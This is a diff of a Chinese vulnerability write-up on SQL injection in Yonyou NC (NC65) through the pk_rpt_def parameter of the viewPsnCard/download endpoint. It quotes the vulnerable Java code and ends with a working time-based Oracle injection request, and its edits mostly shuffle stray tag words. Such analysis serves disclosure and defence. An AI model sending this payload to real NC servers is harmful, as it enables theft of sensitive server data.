@@ -8,7 +8,7 @@ asset_dir: embedded-base64
 
 [用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用/portal/pt/viewPsnCard/download接口中的 pk\_rpt\_def 参数实现sql注入，从而窃取服务器的敏感信息。
 
-编程
+计算机与电子产品
 
 # 影响版本
 
@@ -21,8 +21,6 @@ NC65
 # 漏洞分析
 
 nc/bs/hrss/pub/action/PsnCardAction.class
-
-计算机服务器
 
 ```
 package nc.bs.hrss.pub.action;
@@ -65,15 +63,9 @@ public class PsnCardAction extends BaseAction {
             FileInputStream finput = null;
 ```
 
-深入探索
-
-开发工具
-
-网络
-
-软件
-
 `pk_rpt_def` 带入 queryByPk 函数
+
+编程
 
 ```
 public RepDefVO queryByPk(String pk) throws BusinessException {
@@ -111,7 +103,7 @@ public Collection retrieveByClause(Class className, String condition, String[] f
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")利用示例
 
-编程
+网络
 
 ```
 GET /portal/pt/viewPsnCard/download?pageId=login&pk_rpt_def=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--&pk_psnjob=1 HTTP/1.1
